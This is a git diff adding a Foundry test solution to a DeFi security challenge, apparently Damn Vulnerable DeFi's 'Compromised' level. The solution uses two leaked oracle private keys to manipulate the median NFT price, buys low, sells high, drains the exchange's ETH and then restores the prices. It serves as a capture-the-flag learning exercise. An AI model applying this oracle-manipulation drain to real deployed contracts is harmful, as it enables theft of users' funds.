@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -50,7 +49,7 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle(); // here it was calling public function init
 
         // Deploy the exchange and get an instance to the associated ERC721 token
         exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
@@ -75,7 +74,54 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        //! except private key decoding , remaining was done by me
+        // This one uses Median stratey , instead of average
+        console.log("Owner of exchange : ", nft.owner());
+        console.log("Median price of oracle : ", oracle.getMedianPrice(symbols[0]));
+        oracle.getAllPricesForSymbol(symbols[0]);
+
+        string memory ORACLE_ONE = "ORACLE_ONE";
+        string memory ORACLE_TWO = "ORACLE_TWO";
+
+        uint256 oracleOnePk = vm.envUint(ORACLE_ONE);
+        uint256 oracleTwoPk = vm.envUint(ORACLE_TWO);
+
+        address oracleOneAddr = vm.addr(oracleOnePk);
+        address oracleTwoAddr = vm.addr(oracleTwoPk);
+
+        vm.prank(oracleOneAddr);
+        oracle.postPrice(symbols[0], 1);
+        vm.prank(oracleTwoAddr);
+        oracle.postPrice(symbols[0], 1);
+
+        console.log("After oracle Manipulation");
+
+        console.log("Median price of oracle : ", oracle.getMedianPrice(symbols[0]));
+        oracle.getAllPricesForSymbol(symbols[0]);
+
+        console.log("Address of player : ", player);
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 0.1 ether}();
+
+        vm.prank(oracleOneAddr);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE + 1);
+        vm.prank(oracleTwoAddr);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE + 1);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer failed");
+        vm.stopPrank();
+
+        // moving prices to the initial one
+
+        vm.prank(oracleOneAddr);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+        vm.prank(oracleTwoAddr);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
     }
 
     /**
